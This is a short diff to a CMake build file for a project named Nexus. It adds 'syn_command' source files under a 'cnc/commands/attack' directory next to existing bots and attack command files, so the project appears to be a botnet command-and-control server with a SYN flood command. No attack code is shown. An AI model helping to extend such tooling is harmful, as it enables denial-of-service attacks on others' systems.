@@ -16,4 +16,6 @@ add_executable(Nexus cnc/server.c
         cnc/commands/bots_command.c
         cnc/commands/bots_command.h
         cnc/commands/Attack_command.c
-        cnc/commands/Attack_command.h)
+        cnc/commands/Attack_command.h
+        cnc/commands/attack/syn_command.c
+        cnc/commands/attack/syn_command.h)
